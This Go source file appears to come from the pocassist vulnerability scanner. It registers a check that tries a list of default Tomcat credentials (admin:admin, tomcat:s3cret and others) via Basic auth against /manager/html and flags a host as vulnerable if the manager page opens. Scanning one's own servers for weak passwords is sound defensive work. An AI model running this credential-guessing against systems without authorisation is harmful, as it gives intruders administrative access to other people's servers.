package scripts

import (
	"bytes"
	"encoding/base64"
	"github.com/valyala/fasthttp"
	"pocassist/utils"
)

// tomcat 弱口令
func TomcatWeakPass(args *ScriptScanArgs) (*utils.ScanResult, error) {
	// 定义报文列表
	var respList []*utils.Response

	fastReq := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(fastReq)

	var rawurl = ConstructUrl(args, "/")
	var fl = []string{"Application Manager", "Welcome to Tomcat"}
	var wl = []string{"admin:admin", "tomcat:tomcat", "admin:123456", "admin:", "root:root",
		"root:", "tomcat:", "tomcat:s3cret"}
	var buf bytes.Buffer
	buf.WriteString(rawurl)
	buf.WriteString("/manager/html")
	loginurl := buf.String()

	fastReq.SetRequestURI(loginurl)
	fastReq.Header.SetMethod(fasthttp.MethodGet)

	for _, value := range wl {
		authValue := "Basic " + base64.StdEncoding.EncodeToString([]byte(value))
		fastReq.Header.Set("Authorization", authValue)

		resp, err := utils.DoFasthttpRequest(fastReq, true)
		if err != nil {
			return nil, err
		}
		if resp.Status == 401 || resp.Status == 403 {
			utils.ResponsePut(resp)
			continue
		}

		if resp.Status == 404 {
			utils.ResponsePut(resp)
			return &utils.InVulnerableResult, nil
		}
		for _, flag := range fl {
			if bytes.Contains(resp.Body, []byte(flag)) {
				respList = append(respList, resp)
				return utils.VulnerableHttpResult(loginurl,"user:pass is"+value, respList), nil
			}
		}
		utils.ResponsePut(resp)
	}

	return &utils.InVulnerableResult, nil
}

func init() {
	ScriptRegister("poc-go-tomcat-weak-pass", TomcatWeakPass)
}
